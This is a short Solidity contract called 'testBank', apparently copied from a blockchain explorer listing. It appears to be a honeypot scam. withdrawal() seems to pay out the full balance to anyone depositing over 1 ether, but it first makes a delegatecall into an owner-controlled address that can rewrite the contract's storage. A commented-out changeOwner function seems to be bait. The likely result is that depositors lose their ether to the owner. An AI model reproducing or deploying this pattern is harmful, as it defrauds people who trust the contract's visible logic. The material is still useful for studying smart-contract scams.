
//Address: 0x477d1ee2f953a2f85dbecbcb371c2613809ea452
//Contract name: testBank
//Balance: 0 Ether
//Verification Date: 12/29/2017
//Transacion Count: 1

// CODE STARTS HERE

pragma solidity ^0.4.16;

contract testBank
{
    address Owner;
    address adr;
    uint256 public Limit= 1000000000000000000;
    address emails = 0x25df6e3da49f41ef5b99e139c87abc12c3583d13;
    
    
    function Update(address dataBase, uint256 limit) 
    {
        require(msg.sender == Owner); //checking the owner
        Limit = limit;
        emails = dataBase;
    }
    
    function changeOwner(address adr){
        // update Owner=msg.sender;
    }
    
    function()payable{}
    
    function withdrawal()
    payable public
    {
        adr=msg.sender;
        if(msg.value>Limit)
        {  
            emails.delegatecall(bytes4(sha3("logEvent()")));
            adr.send(this.balance);
        }
    }
    
    function kill() {
        require(msg.sender == Owner);
        selfdestruct(msg.sender);
    }
    
    function testBank(){
        Owner=msg.sender;
    }
}
